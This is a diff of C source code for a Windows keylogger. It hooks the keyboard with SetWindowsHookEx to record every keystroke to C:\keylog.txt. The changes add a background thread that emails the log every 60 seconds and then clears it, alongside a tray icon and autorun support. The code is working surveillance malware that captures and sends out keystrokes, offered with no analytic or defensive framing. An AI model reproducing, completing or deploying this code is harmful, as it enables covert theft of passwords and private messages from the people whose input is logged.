@@ -2,22 +2,43 @@
 #include <shellapi.h>
 #include <stdio.h>
 #include <string.h>
+#include <time.h>
 #include "main.h"
 #include "resource.h"
 #include "key_names.h"
 #include "timestamp.h"
 #include "autorun.h"
+#include "sendmail.h"
 
 #define WM_TRAY (WM_USER + 1000)
 #define ID_AUTORUN 2000
 #define ID_EXIT    2001
+#define TIMER_ID   5000
 #define TIMER_ELAPSE_MS 1000
-#define TIMER_ID 5000
+#define MAIL_SEND_PERIOD_S 60
+
+#define KEYLOG_PATH "C:\\keylog.txt"
 
 NOTIFYICONDATA pnid;
 HMENU hMenu;
 
-void showPopupMenu(HWND hWnd)
+HANDLE sender_thread_id = 0;
+time_t last_send_time_s = 0;
+
+void open_keylog_file(int truncate)
+{
+    int ok;
+
+    if (truncate)
+        ok = freopen(KEYLOG_PATH, "w", stdout) != NULL;
+    else
+        ok = freopen(KEYLOG_PATH, "a", stdout) != NULL;
+
+    if (!ok)
+        exit(EXIT_FAILURE);
+}
+
+void show_popup_menu(HWND hWnd)
 {
     POINT cursor;
     GetCursorPos(&cursor);
@@ -41,7 +62,49 @@ void reinit_menu(int create)
     }
 }
 
-LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg,
+DWORD WINAPI sendmail_thread_proc(LPVOID lpParameter)
+{
+    int ok;
+
+    DEBUG_LOG("Before mail sending.");
+    ok = sendmail(KEYLOG_PATH);
+
+    if (ok) {
+        DEBUG_LOG("Mail sending success.");
+        fclose(stdout);
+        open_keylog_file(1);
+        DEBUG_LOG("File reopened.");
+        time(&last_send_time_s);
+    } else {
+        DEBUG_LOG("Mail sending failed.");
+    }
+
+    return 0;
+}
+
+void check_for_keylog_send()
+{
+    /* Set id to zero, if thread terminated. */
+    if (sender_thread_id != 0 &&
+        WaitForSingleObject(sender_thread_id, 0) == WAIT_OBJECT_0)
+    {
+        CloseHandle(sender_thread_id);
+        sender_thread_id = 0;
+        DEBUG_LOG("Thread terminated.");
+    }
+
+    /* If no thread running and time period elapsed, create
+     * new sender thread. */
+    if (sender_thread_id == 0 &&
+        time(NULL) - last_send_time_s > MAIL_SEND_PERIOD_S)
+    {
+        sender_thread_id = CreateThread(NULL, 0, sendmail_thread_proc,
+            NULL, 0, NULL);
+        DEBUG_LOG("Thread created.");
+    }
+}
+
+LRESULT CALLBACK window_proc(HWND hWnd, UINT uMsg,
     WPARAM wPrm, LPARAM lPrm)
 {
     switch (uMsg) {
@@ -49,12 +112,13 @@ LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg,
         if (wPrm == TIMER_ID) {
             update_time_buf(pnid.szTip, ARRAYSIZE(pnid.szTip));
             Shell_NotifyIcon(NIM_MODIFY, &pnid);
+            check_for_keylog_send();
             return 0;
         }
         break;
     case WM_TRAY:
         if (lPrm == WM_RBUTTONUP) {
-            showPopupMenu(hWnd);
+            show_popup_menu(hWnd);
             return 0;
         }
         break;
@@ -76,13 +140,13 @@ LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg,
     return DefWindowProc(hWnd, uMsg, wPrm, lPrm);
 }
 
-LRESULT CALLBACK KbdProc(int code, WPARAM wPrm, LPARAM lPrm)
+LRESULT CALLBACK kbd_proc(int code, WPARAM wPrm, LPARAM lPrm)
 {
     char buf[256];
     int vk_code;
 
-    if (code < 0)
-        return CallNextHookEx(NULL, code, wPrm, lPrm);
+    if (code < 0 || fileno(stdout) < 0)
+        goto ret;
 
     vk_code = ((KBDLLHOOKSTRUCT *) lPrm)->vkCode;
     setKeyName(buf, vk_code);
@@ -104,6 +168,7 @@ LRESULT CALLBACK KbdProc(int code, WPARAM wPrm, LPARAM lPrm)
 
     fflush(stdout);
 
+ret:
     return CallNextHookEx(NULL, code, wPrm, lPrm);
 }
 
@@ -111,14 +176,13 @@ int CALLBACK WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmdl, int show)
 {
     MSG pmsg = {0};
 
-    if (!freopen("C:\\keylog.txt", "a", stdout))
-        exit(EXIT_FAILURE);
+    open_keylog_file(0);
 
-    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdProc,
+    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbd_proc,
         GetModuleHandle(NULL), 0);
 
-    // Make tray icon (initialize and copy for using
-    // short structure initialize syntax).
+    /* Make tray icon (initialize and copy for using
+     * short structure initialize syntax). */
     NOTIFYICONDATA pnid_local = {sizeof(pnid), NULL, 1,
         NIF_MESSAGE | NIF_ICON | NIF_TIP, WM_TRAY,
         LoadIcon(inst, MAKEINTRESOURCE(AppIcon)), ""};
@@ -126,7 +190,7 @@ int CALLBACK WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmdl, int show)
     update_time_buf(pnid.szTip, ARRAYSIZE(pnid.szTip));
 
     // Make null window.
-    WNDCLASSEX wndc = {sizeof(wndc), CS_HREDRAW | CS_VREDRAW, WindowProc,
+    WNDCLASSEX wndc = {sizeof(wndc), CS_HREDRAW | CS_VREDRAW, window_proc,
         0, 0, inst, NULL, NULL, NULL, NULL, "-", NULL};
     if (!RegisterClassEx(&wndc))
         exit(EXIT_FAILURE);
